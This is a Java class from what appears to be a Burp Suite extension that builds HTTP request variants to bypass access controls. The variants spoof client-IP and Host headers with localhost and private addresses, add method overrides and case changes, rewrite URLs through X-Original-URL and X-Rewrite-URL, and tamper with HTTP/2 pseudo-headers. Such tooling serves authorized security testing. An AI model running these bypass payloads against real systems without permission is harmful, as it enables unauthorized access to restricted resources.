package burp.payload;

import burp.core.ExtensionContext;
import burp.core.Variant;
import burp.util.EncoderUtils;

import burp.api.montoya.http.message.requests.HttpRequest;

import java.util.ArrayList;
import java.util.List;

public class HeaderPayloadBuilder {

    private final ExtensionContext ctx;

    public HeaderPayloadBuilder(ExtensionContext ctx) {
        this.ctx = ctx;
    }

    public List<Variant> build(HttpRequest baseReq) {
        List<Variant> out = new ArrayList<>();
        if (ctx.chkHeaderIP.isSelected()) {
            String[] ipHeaders = {"X-Real-IP", "X-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Server",
                    "X-Originating-IP", "X-Remote-IP", "X-Client-IP", "True-Client-IP", "CF-Connecting-IP",
                    "Fastly-Client-IP", "Akamai-Client-IP", "X-Cluster-Client-IP", "X-ProxyUser-IP", "X-Proxy-Addr",
                    "Forwarded", "X-Custom-IP-Authorization", "X-Host"};
            String[] ipValues = {"127.0.0.1", "localhost", "0.0.0.0", "::1", "192.168.0.1", "10.0.0.1"};
            for (String h : ipHeaders) {
                for (String val : ipValues) {
                    if (h.equals("Forwarded"))
                        out.add(new Variant("IP: " + h + "=" + val,
                                EncoderUtils.addOrReplaceHeader(baseReq, h, "for=" + val + ";proto=http")));
                    else
                        out.add(new Variant("IP: " + h + "=" + val, EncoderUtils.addOrReplaceHeader(baseReq, h, val)));
                }
            }
            out.add(new Variant("HOST: localhost", EncoderUtils.addOrReplaceHeader(baseReq, "Host", "localhost")));
            out.add(new Variant("HOST: 127.0.0.1", EncoderUtils.addOrReplaceHeader(baseReq, "Host", "127.0.0.1")));
        }
        if (ctx.chkHeaderMethod.isSelected()) {
            String[] directMethods = {"POST", "PUT", "PATCH", "DELETE", "OPTIONS", "TRACE", "HEAD",
                    "PROPFIND", "DEBUG", "MOVE", "MKCOL", "COPY", "LOCK", "UNLOCK", "SEARCH",
                    "PROPPATCH", "PURGE"};
            for (String m : directMethods)
                out.add(new Variant("METHOD: " + m, baseReq.withMethod(m)));

            String originalMethod = baseReq.method();
            String[] caseVariants = {
                    originalMethod.toLowerCase(),
                    originalMethod.substring(0, 1).toUpperCase() + originalMethod.substring(1).toLowerCase(),
                    originalMethod.substring(0, 1).toLowerCase() + originalMethod.substring(1).toUpperCase(),
                    EncoderUtils.flipCase(originalMethod)
            };
            for (String cv : caseVariants)
                if (!cv.equals(originalMethod))
                    out.add(new Variant("METHOD-CASE: " + cv, baseReq.withMethod(cv)));

            String[] overrideHeaders = {"X-HTTP-Method-Override", "X-Original-Method", "X-Method-Override", "X-HTTP-Method"};
            String[] methods = {"GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "TRACE", "HEAD", "CONNECT", "PROPFIND", "DEBUG", "MOVE"};
            for (String h : overrideHeaders)
                for (String m : methods)
                    out.add(new Variant("OVR: " + h + "=" + m, EncoderUtils.addOrReplaceHeader(baseReq, h, m)));

            String[] contentTypes = {"application/json", "application/xml", "application/x-www-form-urlencoded",
                    "text/plain", "text/html", "multipart/form-data",
                    "application/merge-patch+json", "application/soap+xml"};
            for (String ct : contentTypes)
                out.add(new Variant("CT: Content-Type=" + ct, EncoderUtils.addOrReplaceHeader(baseReq, "Content-Type", ct)));

            String[] acceptValues = {"application/json", "application/xml", "text/html", "text/plain", "*/*",
                    "application/json, text/html;q=0.9", "application/vnd.api+json"};
            for (String av : acceptValues)
                out.add(new Variant("ACCEPT: " + av, EncoderUtils.addOrReplaceHeader(baseReq, "Accept", av)));
        }
        if (ctx.chkHeaderRewrite.isSelected()) {
            String path = baseReq.path();
            String pathOnly = path.contains("?") ? path.substring(0, path.indexOf('?')) : path;
            String query    = path.contains("?") ? path.substring(path.indexOf('?')) : "";

            out.add(new Variant("REWRITE: X-Original-URL → " + pathOnly,
                    EncoderUtils.addOrReplaceHeader(baseReq.withPath("/" + query), "X-Original-URL", pathOnly)));
            out.add(new Variant("REWRITE: X-Rewrite-URL → " + pathOnly,
                    EncoderUtils.addOrReplaceHeader(baseReq.withPath("/" + query), "X-Rewrite-URL", pathOnly)));
            out.add(new Variant("REWRITE: X-Original-URL → " + path,
                    EncoderUtils.addOrReplaceHeader(baseReq.withPath("/"), "X-Original-URL", path)));
            out.add(new Variant("REWRITE: X-Rewrite-URL → " + path,
                    EncoderUtils.addOrReplaceHeader(baseReq.withPath("/"), "X-Rewrite-URL", path)));
            out.add(new Variant("REWRITE: X-Accel-Redirect → " + pathOnly,
                    EncoderUtils.addOrReplaceHeader(baseReq, "X-Accel-Redirect", pathOnly)));

            out.add(new Variant("H2: :authority=localhost",
                    EncoderUtils.addOrReplaceHeader(baseReq, ":authority", "localhost")));
            out.add(new Variant("H2: :authority=127.0.0.1",
                    EncoderUtils.addOrReplaceHeader(baseReq, ":authority", "127.0.0.1")));
            out.add(new Variant("H2: :path=" + pathOnly,
                    EncoderUtils.addOrReplaceHeader(baseReq.withPath("/"), ":path", pathOnly)));
            out.add(new Variant("H2: :path=" + path,
                    EncoderUtils.addOrReplaceHeader(baseReq.withPath("/"), ":path", path)));

            out.add(new Variant("SCHEME: X-Forwarded-Proto=https",  EncoderUtils.addOrReplaceHeader(baseReq, "X-Forwarded-Proto",  "https")));
            out.add(new Variant("SCHEME: X-Forwarded-Scheme=https", EncoderUtils.addOrReplaceHeader(baseReq, "X-Forwarded-Scheme", "https")));
            out.add(new Variant("SCHEME: X-Forwarded-Proto=http",   EncoderUtils.addOrReplaceHeader(baseReq, "X-Forwarded-Proto",  "http")));
            out.add(new Variant("SCHEME: Front-End-Https=on",       EncoderUtils.addOrReplaceHeader(baseReq, "Front-End-Https",    "on")));
            out.add(new Variant("SCHEME: X-Forwarded-Ssl=on",       EncoderUtils.addOrReplaceHeader(baseReq, "X-Forwarded-Ssl",   "on")));
        }
        for (String ip : ctx.txtHeaderIPs.getText().split("\n"))
            if (!ip.trim().isEmpty())
                out.add(new Variant("CUSTOM IP: " + ip.trim(), EncoderUtils.addOrReplaceHeader(baseReq, "X-Forwarded-For", ip.trim())));
        for (String hdr : ctx.txtHeaderHeaders.getText().split("\n"))
            if (hdr.contains(":")) {
                String[] p = hdr.split(":", 2);
                out.add(new Variant("CUSTOM HDR: " + p[0].trim(), EncoderUtils.addOrReplaceHeader(baseReq, p[0].trim(), p[1].trim())));
            }
        return out;
    }
}
